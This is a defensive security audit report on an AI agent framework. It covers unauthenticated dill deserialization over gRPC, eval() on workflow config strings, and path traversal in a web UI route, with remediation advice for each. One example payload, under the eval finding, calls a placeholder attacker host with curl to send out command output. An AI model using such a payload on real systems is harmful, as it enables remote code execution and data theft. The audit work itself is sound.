Traditional Security Vulnerability Assessment تقرير
Target: /home/shiqiu/agentscope-0.0.4
Date: 2026-01-28

Scope summary
- Languages: Python (primary), plus HTML/CSS/JS assets
- Entry points/boundaries reviewed: CLI workflow loader, gRPC RPC agent server, Flask web UI, service utilities (file I/O, code execution)
- High-risk subsystems: RPC agent server (network), workflow config parsing, file I/O, code execution utilities

Findings

1) Unauthenticated gRPC agent creation uses dill deserialization -> Remote Code Execution (RCE)
Category: Insecure Deserialization / Network Exposure
Severity: Critical

Evidence
- /home/shiqiu/agentscope-0.0.4/src/agentscope/agents/rpc_agent.py:335-341, 735-748

Snippet
    if local_mode:
        server.add_insecure_port(f"localhost:{port}")
    else:
        server.add_insecure_port(f"0.0.0.0:{port}")

    def _create_agent(self, request: RpcMsg) -> RpcMsg:
        self.check_and_generate_agent(
            request.agent_id,
            agent_configs=(
                dill.loads(base64.b64decode(request.value))
                if request.value
                else None
            ),
        )

Attack scenario
- An attacker with network access to the gRPC port (especially when local_mode=False) crafts a request to the _create_agent RPC with a malicious dill payload.
- dill.loads executes attacker-controlled code during deserialization, yielding arbitrary command execution in the server process.

Impact
- Full remote code execution in the gRPC server process context.
- Potential data exfiltration, system compromise, and lateral movement.

Preconditions/Assumptions
- RPC server is reachable by the attacker (local_mode disabled or port exposed via container/host networking).
- dill is installed (otherwise this code path is inactive).

Remediation (preferred minimal fix)
- Remove dill-based deserialization from network inputs. Replace with a safe, typed serialization format (e.g., JSON/protobuf) and strict schema validation.

Defense-in-depth
- Require authentication/authorization on all RPC calls (mTLS or token-based auth).
- Bind only to localhost by default and enforce a deny-by-default network policy.
- If absolutely required, only allow deserialization of signed payloads from a trusted caller.

Secure-by-default alternative
- Use protobuf message fields for agent configuration; do not accept arbitrary objects across the wire.


2) Arbitrary code execution via eval() on workflow config values
Category: Code Injection / Unsafe Evaluation
Severity: High

Evidence
- /home/shiqiu/agentscope-0.0.4/src/agentscope/web/workstation/workflow_utils.py:5-12
- /home/shiqiu/agentscope-0.0.4/src/agentscope/web/workstation/workflow_dag.py:274-279

Snippet
    def is_callable_expression(s: str) -> bool:
        ...
        result = eval(s)
        return callable(result)

    elif is_callable_expression(value):
        raw_info["data"]["args"][key] = eval(value)

Attack scenario
- An attacker supplies or modifies the workflow JSON configuration (CLI input or UI-provided file) with a value such as "__import__('os').system('curl http://attacker/`id`')".
- During config sanitization, eval() executes the payload, leading to arbitrary code execution on the host.

Impact
- Arbitrary code execution during workflow load/compile.
- Compromise of local environment, data theft, or destructive actions.

Preconditions/Assumptions
- Attacker can control the workflow config file contents or submit them through any interface that loads configs.

Remediation (preferred minimal fix)
- Remove eval() usage. If you need to support callable references, implement an explicit allowlist mapping (e.g., {"module.func": module.func}) and resolve via importlib with strict validation.

Defense-in-depth
- Use ast.literal_eval only for safe literals (numbers/strings/lists/dicts) and reject anything else.
- Validate config schema before execution and reject unexpected keys/types.

Secure-by-default alternative
- Restrict config args to JSON-serializable primitives and compose callables in code, not in config strings.


3) Path traversal in web UI run detail endpoint enables unintended file reads
Category: Path Traversal / Information Disclosure
Severity: Medium

Evidence
- /home/shiqiu/agentscope-0.0.4/src/agentscope/web/_app.py:48-74

Snippet
@app.route("/run/<run_dir>")
def run_detail(run_dir: str) -> str:
    path_run = os.path.join(PATH_SAVE, run_dir)
    path_log = os.path.join(path_run, "logging.log")
    path_dialog = os.path.join(path_run, "logging.chat")
    ...
    path_cfg = os.path.join(PATH_SAVE, run_dir, ".config")

Attack scenario
- A remote user requests /run/.. (or similar dot-path) to escape PATH_SAVE.
- The handler attempts to read logging.log/logging.chat/.config from parent directories, potentially exposing sensitive files if present.

Impact
- Unintended disclosure of files outside the intended run directory (limited to filenames checked).

Preconditions/Assumptions
- Web UI is exposed to untrusted users.
- Parent or sibling directories contain files with the expected names (logging.log/logging.chat/.config).

Remediation (preferred minimal fix)
- Normalize and validate run_dir. Reject path segments containing ".." or path separators. Resolve realpath and verify it stays under PATH_SAVE before reading any file.

Defense-in-depth
- Use a safe path join function and a strict allowlist (e.g., only directories discovered in PATH_SAVE).
- Add authentication/authorization to restrict access to run details.

Secure-by-default alternative
- Use a server-side index of run IDs and map IDs to absolute paths; never accept raw path components from the client.


Notes on coverage
- Reviewed RPC server/client, workflow parsing/execution, web UI endpoints, file I/O and code execution utilities.
- Minimized false positives: findings only reported where untrusted input can reach a dangerous sink with minimal assumptions.
